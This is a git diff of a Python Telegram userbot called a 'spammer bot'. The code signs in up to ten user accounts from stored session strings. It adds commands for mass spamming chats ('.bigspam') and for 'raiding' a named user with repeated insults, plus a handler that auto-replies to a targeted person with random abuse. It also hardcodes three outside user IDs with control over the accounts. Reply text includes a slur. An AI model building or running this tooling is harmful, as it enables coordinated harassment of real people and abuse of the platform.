@@ -1,9 +1,12 @@
+###########
+###########
+###########
+###########
 import asyncio
 import os
 import random
 import sys
 from datetime import datetime
-
 import telethon.utils
 from telethon import TelegramClient, events
 from telethon.errors import (
@@ -15,7 +18,6 @@ from telethon.sessions import StringSession
 from telethon.tl import functions, types
 from telethon.tl.functions.channels import GetFullChannelRequest, LeaveChannelRequest
 from telethon.tl.functions.messages import GetFullChatRequest, ImportChatInviteRequest
-
 from Config import (
     API_HASH,
     API_ID,
@@ -32,7 +34,10 @@ from Config import (
     SUDO_USERS,
 )
 from Utils import RAID, RRAID
-
+###########
+###########
+###########      
+###########
 a = API_ID
 b = API_HASH
 smex = STRING
@@ -45,68 +50,84 @@ seven = STRING7
 eight = STRING8
 ninth = STRING9
 tenth = STRING_10
-
-
-luc = ""
-luc2 = ""
-luc3 = ""
-luc4 = ""
-luc5 = ""
-luc6 = ""
-luc7 = ""
-luc8 = ""
-luc9 = ""
-luc10 = ""
-
-
+###########
+###########
+###########      
+###########
+omp = ""
+omp2 = ""
+omp3 = ""
+omp4 = ""
+omp5 = ""
+omp6 = ""
+omp7 = ""
+omp8 = ""
+omp9 = ""
+omp10 = ""
+###########
+###########
+###########      
+###########
 que = {}
-
+###########
+###########
+###########      
+###########
 SMEX_USERS = [658876201, 2092103173, 5138767016]
 for x in SUDO_USERS:
     SMEX_USERS.append(x)
-
-
+###########
+###########
+###########      
+###########
 async def start_Vansh():
-    global luc
-    global luc2
-    global luc3
-    global luc4
-    global luc5
-    global luc6
-    global luc7
-    global luc8
-    global luc9
-    global luc10
+    global omp
+    global omp2
+    global omp3
+    global omp4
+    global omp5
+    global omp6
+    global omp7
+    global omp8
+    global omp9
+    global omp10
+###########
+###########      
+###########
+###########   
     if smex:
-        session_name = str(smex)
+    	session_name = str(smex)
         print("String 1 Found")
-        luc = TelegramClient(StringSession(session_name), a, b)
+        omp = TelegramClient(StringSession(session_name), a, b)
         try:
-            print("Booting Up The Client 1")
-            await luc.start()
-            botme = await luc.get_me()
+        	print("Booting Up The Client 1")
+            await omp.start()
+            botme = await omp.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
-            luc = "smex"
+            omp = "smex"
             print(e)
     else:
         print("Session 1 not Found")
         session_name = "RoodxPunjabi"
-        luc = TelegramClient(session_name, a, b)
+        omp = TelegramClient(session_name, a, b)
         try:
-            await luc.start()
+            await omp.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if smexx:
         session_name = str(smexx)
         print("String 2 Found")
-        luc2 = TelegramClient(StringSession(session_name), a, b)
+        omp2 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 2")
-            await luc2.start()
-            botme = await luc2.get_me()
+            await omp2.start()
+            botme = await omp2.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -114,20 +135,23 @@ async def start_Vansh():
     else:
         print("Session 2 not Found")
         session_name = "RoodxPunjabi"
-        luc2 = TelegramClient(session_name, a, b)
+        omp2 = TelegramClient(session_name, a, b)
         try:
-            await luc2.start()
+            await omp2.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if smexxx:
         session_name = str(smexxx)
         print("String 3 Found")
-        luc3 = TelegramClient(StringSession(session_name), a, b)
+        omp3 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 3")
-            await luc3.start()
-            botme = await luc3.get_me()
+            await omp3.start()
+            botme = await omp3.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -135,20 +159,23 @@ async def start_Vansh():
     else:
         print("Session 3 not Found")
         session_name = "startup"
-        luc3 = TelegramClient(session_name, a, b)
+        omp3 = TelegramClient(session_name, a, b)
         try:
-            await luc3.start()
+            await omp3.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if smexxxx:
         session_name = str(smexxxx)
         print("String 4 Found")
-        luc4 = TelegramClient(StringSession(session_name), a, b)
+        omp4 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 4")
-            await luc4.start()
-            botme = await luc4.get_me()
+            await omp4.start()
+            botme = await omp4.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -156,20 +183,23 @@ async def start_Vansh():
     else:
         print("Session 4 not Found")
         session_name = "startup"
-        luc4 = TelegramClient(session_name, a, b)
+        omp4 = TelegramClient(session_name, a, b)
         try:
-            await luc4.start()
+            await omp4.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if smexxxxx:
         session_name = str(smexxxxx)
         print("String 5 Found")
-        luc5 = TelegramClient(StringSession(session_name), a, b)
+        omp5 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 5")
-            await luc5.start()
-            botme = await luc5.get_me()
+            await omp5.start()
+            botme = await omp5.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -177,20 +207,23 @@ async def start_Vansh():
     else:
         print("Session 5 not Found")
         session_name = "startup"
-        luc5 = TelegramClient(session_name, a, b)
+        omp5 = TelegramClient(session_name, a, b)
         try:
-            await luc5.start()
+            await omp5.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if sixth:
         session_name = str(sixth)
         print("String 6 Found")
-        luc6 = TelegramClient(StringSession(session_name), a, b)
+        omp6 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 6")
-            await luc6.start()
-            botme = await luc6.get_me()
+            await omp6.start()
+            botme = await omp6.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -198,20 +231,23 @@ async def start_Vansh():
     else:
         print("Session 6 not Found")
         session_name = "startup"
-        luc6 = TelegramClient(session_name, a, b)
+        omp6 = TelegramClient(session_name, a, b)
         try:
-            await luc6.start()
+            await omp6.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if seven:
         session_name = str(seven)
         print("String 7 Found")
-        luc7 = TelegramClient(StringSession(session_name), a, b)
+        omp7 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 7")
-            await luc7.start()
-            botme = await luc7.get_me()
+            await omp7.start()
+            botme = await omp7.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -219,20 +255,23 @@ async def start_Vansh():
     else:
         print("Session 7 not Found")
         session_name = "startup"
-        luc7 = TelegramClient(session_name, a, b)
+        omp7 = TelegramClient(session_name, a, b)
         try:
-            await luc7.start()
+            await omp7.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if eight:
         session_name = str(eight)
         print("String 8 Found")
-        luc8 = TelegramClient(StringSession(session_name), a, b)
+        omp8 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 8")
-            await luc8.start()
-            botme = await luc8.get_me()
+            await omp8.start()
+            botme = await omp8.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -240,20 +279,23 @@ async def start_Vansh():
     else:
         print("Session 8 not Found")
         session_name = "startup"
-        luc8 = TelegramClient(session_name, a, b)
+        omp8 = TelegramClient(session_name, a, b)
         try:
-            await luc8.start()
+            await omp8.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if ninth:
         session_name = str(ninth)
         print("String 9 Found")
-        luc9 = TelegramClient(StringSession(session_name), a, b)
+        omp9 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 9")
-            await luc9.start()
-            botme = await luc9.get_me()
+            await omp9.start()
+            botme = await omp9.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -261,20 +303,23 @@ async def start_Vansh():
     else:
         print("Session 9 not Found")
         session_name = "startup"
-        luc9 = TelegramClient(session_name, a, b)
+        omp9 = TelegramClient(session_name, a, b)
         try:
-            await luc9.start()
+            await omp9.start()
         except Exception:
             pass
-
+###########
+###########
+###########      
+###########
     if tenth:
         session_name = str(tenth)
         print("String 10 Found")
-        luc10 = TelegramClient(StringSession(session_name), a, b)
+        omp10 = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 10")
-            await luc10.start()
-            botme = await luc10.get_me()
+            await omp10.start()
+            botme = await omp10.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -282,17 +327,17 @@ async def start_Vansh():
     else:
         print("Session 10 not Found")
         session_name = "startup"
-        luc10 = TelegramClient(session_name, a, b)
+        omp10 = TelegramClient(session_name, a, b)
         try:
-            await luc10.start()
+            await omp10.start()
         except Exception:
             pass
-
-
+###########
+###########
+###########      
+###########
 loop = asyncio.get_event_loop()
 loop.run_until_complete(start_Vansh())
-
-
 async def gifspam(e, smex):
     try:
         await e.client(
@@ -307,18 +352,20 @@ async def gifspam(e, smex):
         )
     except Exception:
         pass
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.join"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.join"))
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
     if e.sender_id in SMEX_USERS:
@@ -334,18 +381,42 @@ async def _(e):
                 await event.edit(str(e))
         else:
             await e.reply(usage, parse_mode=None, link_preview=None)
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
+async def alive(e):
+    if e.sender_id in SMEX_USERS:
+        start = datetime.now()
+        rkoh = "Cheaking..."
+        event = await e.reply(rkoh, parse_mode=None, link_preview=None)
+        end = datetime.now()
+        ms = (end - start).microseconds / 1000
+        await event.edit(f"🤖 I Am Still alive Lomdike !!!!\n`{ms}` 𝗺𝘀\n    〄 **╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝** SᑭᗩᗰᗰEᖇ ᗷOT 〄")
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
     if e.sender_id in SMEX_USERS:
@@ -361,18 +432,20 @@ async def _(e):
                 await event.edit(str(e))
         else:
             await e.reply(usage, parse_mode=None, link_preview=None)
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
     if e.sender_id in SMEX_USERS:
@@ -389,20 +462,20 @@ async def _(e):
                 await event.edit(str(e))   
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
-
-
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
     if e.sender_id in SMEX_USERS:
@@ -436,17 +509,20 @@ async def spam(e):
                     await asyncio.sleep(0.0)
         else:
             await e.reply(usage, parse_mode=None, link_preview=None)
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
     if e.sender_id in SMEX_USERS:
@@ -483,18 +559,20 @@ async def spam(e):
                     await asyncio.sleep(0.0)
         else:
             await e.reply(usage, parse_mode=None, link_preview=None)
-
-
-@luc.on(events.NewMessage(incoming=True))
-@luc2.on(events.NewMessage(incoming=True))
-@luc3.on(events.NewMessage(incoming=True))
-@luc4.on(events.NewMessage(incoming=True))
-@luc5.on(events.NewMessage(incoming=True))
-@luc6.on(events.NewMessage(incoming=True))
-@luc7.on(events.NewMessage(incoming=True))
-@luc8.on(events.NewMessage(incoming=True))
-@luc9.on(events.NewMessage(incoming=True))
-@luc10.on(events.NewMessage(incoming=True))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True))
+@omp2.on(events.NewMessage(incoming=True))
+@omp3.on(events.NewMessage(incoming=True))
+@omp4.on(events.NewMessage(incoming=True))
+@omp5.on(events.NewMessage(incoming=True))
+@omp6.on(events.NewMessage(incoming=True))
+@omp7.on(events.NewMessage(incoming=True))
+@omp8.on(events.NewMessage(incoming=True))
+@omp9.on(events.NewMessage(incoming=True))
+@omp10.on(events.NewMessage(incoming=True))
 async def _(event):
     global que
     queue = que.get(event.sender_id)
@@ -508,19 +586,20 @@ async def _(event):
             message="""{}""".format(random.choice(RRAID)),
             reply_to=event.message.id,
         )
-
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
 async def ping(e):
     if e.sender_id in SMEX_USERS:
         start = datetime.now()
@@ -529,184 +608,201 @@ async def ping(e):
         end = datetime.now()
         ms = (end - start).microseconds / 1000
         await event.edit(f"🤖 I Am Still alive Lomdike !!!!\n`{ms}` 𝗺𝘀\n    〄 **╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝** SᑭᗩᗰᗰEᖇ ᗷOT 〄")
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
 async def restart(e):
     if e.sender_id in SMEX_USERS:
         text = "[ R E S T A R T I N G ]\n\nPlease wait till it reboots..."
         await e.reply(text, parse_mode=None, link_preview=None)
         try:
-            await idk.disconnect()
+            await omp.disconnect()
         except Exception:
             pass
         try:
-            await ydk.disconnect()
+            await omp2.disconnect()
         except Exception:
             pass
         try:
-            await wdk.disconnect()
+            await omp3.disconnect()
         except Exception:
             pass
         try:
-            await hdk.disconnect()
+            await omp4.disconnect()
         except Exception:
             pass
         try:
-            await sdk.disconnect()
+            await omp5.disconnect()
         except Exception:
             pass
         try:
-            await adk.disconnect()
+            await omp6.disconnect()
         except Exception:
             pass
         try:
-            await bdk.disconnect()
+            await omp7.disconnect()
         except Exception:
             pass
         try:
-            await cdk.disconnect()
+            await omp8.disconnect()
         except Exception:
             pass
         try:
-            await ddk.disconnect()
+            await omp10.disconnect()
         except Exception:
             pass
         try:
-            await edk.disconnect()
+            await omp9.disconnect()
         except Exception:
             pass
         os.execl(sys.executable, sys.executable, *sys.argv)
         quit()
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.help"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.help"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.help"))
 async def help(e):
     if e.sender_id in SMEX_USERS:
        text = "🔥 ᏟϴᎷᎷᎪΝᎠՏ 🔥\n\n༒ᏢᏆΝᏀ\n༒ᎡᎬՏͲᎪᎡͲ\n༒ᎫϴᏆΝ\n༒ᏞᎬᎪᏙᎬ\n༒ᏢᎫϴᏆΝ\n༒ᏴᏆᏀՏᏢᎪᎷ\n༒ᎡᎪᏆᎠ\n༒ᎡᎬᏢᏞᎽᎡᎪᏆᎠ\n༒ᎪᏞᏆᏙᎬ"
        await e.reply(text, parse_mode=None, link_preview=None )
-
-
-
-@luc.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc2.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc3.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc4.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc5.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc6.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc7.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc8.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc9.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
-@luc10.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+###########
+###########
+###########
+###########
+@omp.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp2.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp3.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp4.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp5.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp6.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp7.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp8.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp9.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
+@omp10.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
 async def repo(e):
     if e.sender_id in SMEX_USERS:
-       text = "〄 **╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝** SᑭᗩᗰᗰEᖇ ᗷOT 〄\n┏━━━━━━━━━━━━━━━━━━━\n┣➣ Sᴜᴘᴘᴏʀᴛ : [ᒍOIᑎ](https://t.me/TeamRoodChat)\n┣➣ Cʀᴇᴀᴛᴇʀ : [ᖇOOᗪ OᗯᑎEᖇ](https://t.me/Rood_Gamer_Owner)\n┣➣ Rᴇᴩᴏ : [ᒪIᑎK](https://github.com/RoodOwner/)\n┗━━━━━━━━━━━━━━━━━━━"
+       text = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗰEᖇ ᗷOT 〄\n┏━━━━━━━━━━━━━━━━━━━\n┣➣ Sᴜᴘᴘᴏʀᴛ : [ᒍOIᑎ] @TeamRoodChat\n┣➣ Cʀᴇᴀᴛᴇʀ : [ᖇOOᗪ OᗯᑎEᖇ] @Rood_Gamer_Owner)\n┣➣ Rᴇᴩᴏ : [TYᑭE] OC PRIVATE\n┗━━━━━━━━━━━━━━━━━━━"
